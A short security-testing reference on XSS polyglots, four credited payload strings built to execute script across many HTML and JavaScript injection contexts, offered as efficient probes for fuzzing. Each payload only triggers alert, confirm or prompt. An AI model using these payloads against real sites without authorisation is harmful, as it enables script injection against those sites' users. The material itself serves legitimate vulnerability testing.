# XSS Polyglots

When searching for XSS vulnerabilities, you typically need to create payloads to the specific scenario. This is fine once you've found a vulnerability, but it causes issues when fuzzing for vulnerabilities. In order to cater for a large number of scenarios, tools will typically use a long list of payloads just hoping something will stick. This creates a lot of noise and makes manual validation of vulnerabilities difficult to impossible.

Polyglots are special payloads which are designed to work in a wide variety of scenarios. By trying only a few polyglots, you can cast a wider net and catch more vulnerabilities. It also allows easier manual testing to see how an application handles a given polyglot rather than a long list of fuzzing payloads.

## Example XSS Polyglots

Polyglot Payload #1 - [Rsnake XSS Cheat Sheet](https://n0p.net/penguicon/php_app_sec/mirror/xss.html)
```
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

Polyglot Payload #2 - Ashar Javed
```
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

Polyglot Payload #3 - Mathias Karlsson
```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```


Polyglot Payload #4 - [Ahmed Elsobky](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
